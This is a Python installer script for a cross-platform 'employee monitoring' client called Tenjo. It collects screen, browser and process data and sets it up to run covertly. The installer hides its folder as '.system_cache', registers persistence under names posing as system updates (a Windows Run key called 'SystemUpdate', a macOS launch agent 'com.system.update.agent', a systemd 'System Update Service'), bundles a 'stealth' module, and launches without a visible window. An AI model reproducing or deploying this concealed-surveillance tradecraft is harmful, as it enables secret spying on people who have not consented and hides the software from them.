#!/usr/bin/env python3
# Tenjo Client Installer Script
# Cross-platform installation script for employee monitoring

import os
import sys
import platform
import subprocess
import shutil
import urllib.request
import tempfile
import zipfile
from pathlib import Path

class TenjoInstaller:
    def __init__(self):
        self.system = platform.system()
        self.python_executable = sys.executable
        self.install_dir = self.get_install_directory()
        self.server_url = None
        self.api_key = None
        
    def get_install_directory(self):
        """Get installation directory based on OS"""
        if self.system == 'Windows':
            return os.path.join(os.getenv('APPDATA'), '.system_cache')
        else:
            return os.path.join(Path.home(), '.system_cache')
            
    def check_prerequisites(self):
        """Check system prerequisites"""
        print("Checking system prerequisites...")
        
        # Check Python version
        if sys.version_info < (3.7, 0):
            print("Error: Python 3.7 or higher is required")
            return False
            
        # Check if pip is available
        try:
            subprocess.run([self.python_executable, '-m', 'pip', '--version'], 
                         capture_output=True, check=True)
        except subprocess.CalledProcessError:
            print("Error: pip is not available")
            return False
            
        # Check FFmpeg availability (optional but recommended)
        if not shutil.which('ffmpeg'):
            print("Warning: FFmpeg not found. Real-time streaming will not work.")
            print("Install FFmpeg from https://ffmpeg.org/download.html")
            
        print("Prerequisites check completed.")
        return True
        
    def get_user_input(self):
        """Get configuration from user"""
        print("\n=== Tenjo Client Configuration ===")
        
        # Get server URL
        while not self.server_url:
            url = input("Enter dashboard server URL (e.g., https://your-domain.com): ").strip()
            if url.startswith('http'):
                self.server_url = url
            else:
                print("Please enter a valid URL starting with http:// or https://")
                
        # Get API key
        while not self.api_key:
            key = input("Enter API key: ").strip()
            if len(key) > 10:
                self.api_key = key
            else:
                print("Please enter a valid API key")
                
        print(f"Configuration: Server={self.server_url}")
        
    def create_directories(self):
        """Create necessary directories"""
        print("Creating installation directories...")
        
        os.makedirs(self.install_dir, exist_ok=True)
        os.makedirs(os.path.join(self.install_dir, 'logs'), exist_ok=True)
        os.makedirs(os.path.join(self.install_dir, 'data'), exist_ok=True)
        
        # Hide directory on Windows
        if self.system == 'Windows':
            try:
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(self.install_dir, 2)
            except Exception:
                pass
                
    def install_dependencies(self):
        """Install Python dependencies"""
        print("Installing Python dependencies...")
        
        # Create requirements.txt content
        requirements = """
requests>=2.31.0
websocket-client>=1.6.0
psutil>=5.9.0
mss>=9.0.0
Pillow>=10.0.0
schedule>=1.2.0
python-dateutil>=2.8.0
cryptography>=41.0.0
opencv-python>=4.8.0
"""
        
        # Add platform-specific packages
        if self.system == 'Windows':
            requirements += """
pygetwindow>=0.0.9
pywin32>=306
wmi>=1.5.1
"""
        elif self.system == 'Darwin':
            requirements += """
pyobjc-framework-Quartz>=10.0
pyobjc-framework-AppKit>=10.0
"""
            
        # Write requirements file
        req_file = os.path.join(self.install_dir, 'requirements.txt')
        with open(req_file, 'w') as f:
            f.write(requirements.strip())
            
        # Install packages
        try:
            subprocess.run([
                self.python_executable, '-m', 'pip', 'install', '-r', req_file, '--quiet'
            ], check=True)
            print("Dependencies installed successfully.")
        except subprocess.CalledProcessError:
            print("Error: Failed to install dependencies")
            return False
            
        return True
        
    def copy_client_files(self):
        """Copy client files to installation directory"""
        print("Installing client files...")
        
        # Get current script directory
        current_dir = os.path.dirname(os.path.abspath(__file__))
        
        # Files to copy
        files_to_copy = [
            'main.py',
            'src/core/config.py',
            'src/modules/screen_capture.py',
            'src/modules/browser_monitor.py',
            'src/modules/process_monitor.py',
            'src/modules/stream_handler.py',
            'src/utils/stealth.py',
            'src/utils/api_client.py'
        ]
        
        for file_path in files_to_copy:
            src = os.path.join(current_dir, file_path)
            dst = os.path.join(self.install_dir, file_path)
            
            # Create destination directory
            os.makedirs(os.path.dirname(dst), exist_ok=True)
            
            if os.path.exists(src):
                shutil.copy2(src, dst)
            else:
                print(f"Warning: {file_path} not found, creating placeholder...")
                # Create empty file as placeholder
                Path(dst).touch()
                
        # Create __init__.py files
        init_files = [
            'src/__init__.py',
            'src/core/__init__.py',
            'src/modules/__init__.py',
            'src/utils/__init__.py'
        ]
        
        for init_file in init_files:
            init_path = os.path.join(self.install_dir, init_file)
            Path(init_path).touch()
            
    def create_config_file(self):
        """Create configuration file"""
        print("Creating configuration file...")
        
        config_content = f"""# Tenjo Client Configuration
import os

class Config:
    def __init__(self):
        self.server_url = '{self.server_url}'
        self.api_key = '{self.api_key}'
        self.client_id = None
        self.screenshot_interval = 60
        self.upload_batch_size = 10
        self.max_retries = 3
        
        # Paths
        self.install_dir = os.path.dirname(os.path.abspath(__file__))
        self.log_dir = os.path.join(self.install_dir, 'logs')
        self.data_dir = os.path.join(self.install_dir, 'data')
        
    def get_hostname(self):
        import socket
        return socket.gethostname()
        
    def get_os_info(self):
        import platform
        return {{
            'system': platform.system(),
            'release': platform.release(),
            'version': platform.version(),
            'machine': platform.machine()
        }}
        
    def get_ip_address(self):
        import socket
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return '127.0.0.1'
            
    def get_current_user(self):
        import getpass
        return getpass.getuser()
"""
        
        config_path = os.path.join(self.install_dir, 'src', 'core', 'config.py')
        with open(config_path, 'w') as f:
            f.write(config_content)
            
    def install_as_service(self):
        """Install as system service"""
        print("Installing as system service...")
        
        try:
            if self.system == 'Windows':
                self.install_windows_service()
            elif self.system == 'Darwin':
                self.install_macos_service()
            else:
                self.install_linux_service()
        except Exception as e:
            print(f"Warning: Could not install as service: {e}")
            print("Client will need to be started manually.")
            
    def install_windows_service(self):
        """Install Windows service"""
        # Create batch file to run Python script
        batch_content = f"""@echo off
cd /d "{self.install_dir}"
"{self.python_executable}" main.py
"""
        
        batch_file = os.path.join(self.install_dir, 'run_client.bat')
        with open(batch_file, 'w') as f:
            f.write(batch_content)
            
        # Add to startup registry
        try:
            import winreg
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, batch_file)
            winreg.CloseKey(key)
            print("Added to Windows startup.")
        except Exception as e:
            print(f"Could not add to startup: {e}")
            
    def install_macos_service(self):
        """Install macOS Launch Agent"""
        agent_name = "com.system.update.agent"
        plist_path = os.path.expanduser(f"~/Library/LaunchAgents/{agent_name}.plist")
        
        plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{agent_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{self.python_executable}</string>
        <string>{os.path.join(self.install_dir, 'main.py')}</string>
    </array>
    <key>StartInterval</key>
    <integer>30</integer>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>WorkingDirectory</key>
    <string>{self.install_dir}</string>
</dict>
</plist>'''
        
        os.makedirs(os.path.dirname(plist_path), exist_ok=True)
        
        with open(plist_path, 'w') as f:
            f.write(plist_content)
            
        # Load the agent
        subprocess.run(['launchctl', 'load', plist_path], capture_output=True)
        print("macOS Launch Agent installed.")
        
    def install_linux_service(self):
        """Install Linux systemd service"""
        service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
User={os.getenv('USER')}
WorkingDirectory={self.install_dir}
ExecStart={self.python_executable} {os.path.join(self.install_dir, 'main.py')}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
        
        service_file = os.path.expanduser('~/.config/systemd/user/system-update.service')
        os.makedirs(os.path.dirname(service_file), exist_ok=True)
        
        with open(service_file, 'w') as f:
            f.write(service_content)
            
        # Enable and start service
        try:
            subprocess.run(['systemctl', '--user', 'daemon-reload'], check=True)
            subprocess.run(['systemctl', '--user', 'enable', 'system-update.service'], check=True)
            subprocess.run(['systemctl', '--user', 'start', 'system-update.service'], check=True)
            print("Linux systemd service installed.")
        except subprocess.CalledProcessError:
            print("Could not install systemd service.")
            
    def test_installation(self):
        """Test if installation works"""
        print("Testing installation...")
        
        try:
            # Try to import main modules
            sys.path.insert(0, self.install_dir)
            from src.utils.api_client import APIClient
            
            # Test API connection
            api_client = APIClient(self.server_url, self.api_key)
            if api_client.test_connection():
                print("✓ API connection successful")
            else:
                print("⚠ Could not connect to server - check URL and API key")
                
        except ImportError as e:
            print(f"✗ Import error: {e}")
            return False
        except Exception as e:
            print(f"✗ Test failed: {e}")
            return False
            
        return True
        
    def start_client(self):
        """Start the monitoring client"""
        print("Starting Tenjo client...")
        
        try:
            client_script = os.path.join(self.install_dir, 'main.py')
            
            if self.system == 'Windows':
                # Start as background process on Windows
                subprocess.Popen([
                    self.python_executable, client_script
                ], cwd=self.install_dir, creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                # Start as background process on Unix-like systems
                subprocess.Popen([
                    self.python_executable, client_script
                ], cwd=self.install_dir, start_new_session=True)
                
            print("✓ Client started successfully")
            
        except Exception as e:
            print(f"✗ Failed to start client: {e}")
            
    def install(self):
        """Run complete installation process"""
        print("=== Tenjo Client Installer ===")
        print("Employee monitoring system")
        print()
        
        try:
            # Check prerequisites
            if not self.check_prerequisites():
                return False
                
            # Get user configuration
            self.get_user_input()
            
            # Create directories
            self.create_directories()
            
            # Install dependencies
            if not self.install_dependencies():
                return False
                
            # Copy client files
            self.copy_client_files()
            
            # Create configuration
            self.create_config_file()
            
            # Install as service
            self.install_as_service()
            
            # Test installation
            if not self.test_installation():
                print("Installation completed with warnings.")
            else:
                print("✓ Installation completed successfully!")
                
            # Start client
            start_now = input("Start monitoring client now? (y/n): ").lower().strip()
            if start_now in ['y', 'yes']:
                self.start_client()
                
            print()
            print("Installation Summary:")
            print(f"  Install directory: {self.install_dir}")
            print(f"  Server URL: {self.server_url}")
            print("  Client will start automatically on system boot.")
            print()
            print("To uninstall, run the uninstaller script.")
            
            return True
            
        except KeyboardInterrupt:
            print("\nInstallation cancelled by user.")
            return False
        except Exception as e:
            print(f"Installation failed: {e}")
            return False

def main():
    """Main installer function"""
    installer = TenjoInstaller()
    success = installer.install()
    
    if success:
        print("Installation completed successfully!")
        sys.exit(0)
    else:
        print("Installation failed!")
        sys.exit(1)

if __name__ == "__main__":
    main()
